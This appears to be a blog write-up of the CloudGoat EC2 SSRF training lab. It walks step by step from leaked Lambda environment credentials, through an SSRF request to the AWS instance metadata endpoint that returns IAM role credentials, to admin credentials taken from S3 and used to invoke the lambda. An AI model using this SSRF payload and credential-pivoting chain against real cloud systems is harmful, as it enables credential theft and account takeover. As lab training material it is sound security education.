---
title:  "CloudGoat: EC2 Server-side request forgery (SSRF)"
date:   2024-03-26
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-26
---

This scenario, we will start as the `Solus` user which has ReadOnly permission on Lambda function, and the goal is invoking the lambda function.

### List Lambda function
```shell
aws --profile solus lambda list-functions
```
This command will list all lambda functions in our account

Result:
```json
{
    "Functions": [
        {
            "FunctionName": "cg-lambda-ec2_ssrf_###",
            "FunctionArn": "arn:aws:lambda:us-east-1:###:function:cg-lambda-ec2_ssrf_###",
            "Environment": {
                "Variables": {
                    "EC2_ACCESS_KEY_ID": "<ec2-access-key-id>",
                    "EC2_SECRET_KEY_ID": "<ec2-secret-key-id>"
                }
            }
        }
    ]
}
```

You will see the credentials from environment variables. This credentials allow us to get EC2 instance detail.

### List EC2 instances
With previous credentials, we created new user profile called `cg-lambda` and we are able to list all EC2 instances with this user.
```shell
aws --profile cg-lambda ec2 describe-instances
```
This command will list all EC2 instances in your account.

Result:
```json
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "ImageId": "ami-0a313d6098716f372",
                    "InstanceId": "<instance-id>",
                    "InstanceType": "t2.micro",
                    "PublicDnsName": "<public-dns-name>",
                    "PublicIpAddress": "<public-ip-address",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    }
                }
            ]
        }
    ]
}
```
You will get an EC2 instance which has a vulnerability that are allow us to request metadata of the instance itself and expose it credentials.
### Get credentials from the compromised instance
When we request the instance IP Address, we will get an error.
```
TypeError: URL must be a string, not undefined
    at new Needle (/node_modules/needle/lib/needle.js:151:11)
    at Function.module.exports.(anonymous function) [as get] (/node_modules/needle/lib/needle.js:846:12)
    at /home/ubuntu/app/ssrf-demo-app.js:32:12
    at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)
    at next (/node_modules/express/lib/router/route.js:149:13)
    at Route.dispatch (/node_modules/express/lib/router/route.js:119:3)
    at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)
    at /node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/node_modules/express/lib/router/index.js:346:12)
    at next (/node_modules/express/lib/router/index.js:280:10)
```
This error tells us that it can receive the parameter name `URL` and we will use this paramter to get the metadata.

Go to

`http://<instance-ip-address>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

And it will show you the role `cg-ec2-role-ec2_ssrf_###`. This role is the role of the instance profile that are attached with this instance.

Now, we can get the credentials of the role by entering

`http://<instance-ip-address>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`

When you put the role name in this url, it will return you the credentials of this role.

This role allow us to read and download files from s3.

### Get admin credentials from S3
We created a new user profile from previous credentials name `cg-ec2`, and we will list all bucket in S3.

```shell
aws --profile cg-ec2 s3 ls
```
This command will list all the bucket in S3

Result:
```
2024-03-26 19:06:55 cg-secret-s3-bucket-ec2-ssrf-###
```
We got a bucket `cg-secret-s3-bucket-ec2-ssrf-###`

To see all the files in the `cg-secret-s3-bucket-ec2-ssrf-###` bucket
```shell
aws --profile cg-ec2 s3 ls cg-secret-s3-bucket-ec2-ssrf-###
```

Result:
```
2024-03-26 19:07:03         62 admin-user.txt
```
In this bucket, there is a file name `admin-user.txt`.

To download `admin-user.txt` from S3 to our local computer
```shell
aws --profile cg-ec2 s3 cp s3://cg-secret-s3-bucket-ec2-ssrf-###/admin-user.txt ./
```

Now, we got the `admin-user.txt` file. Inside the file, we will get another credentials which allows us to invoke the lambda functions

### Invoke Lambda Function
We created a new user profile name `cg-admin` from the credentials in the `admin-user.txt` file.

We knew what lamba function name from previous section, so we will invoke by this command.
```shell
aws --profile cg-admin lambda invoke --function-name cg-lambda-ec2_ssrf_### ./out.txt
```
This command will return the result in the file name `out.txt`

Result:
```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

To check that we succeed,
```shell
cat out.txt
```

Result:
```
"You win!"
```

Yeah, you win. Congratulations 🎉🎉🎉
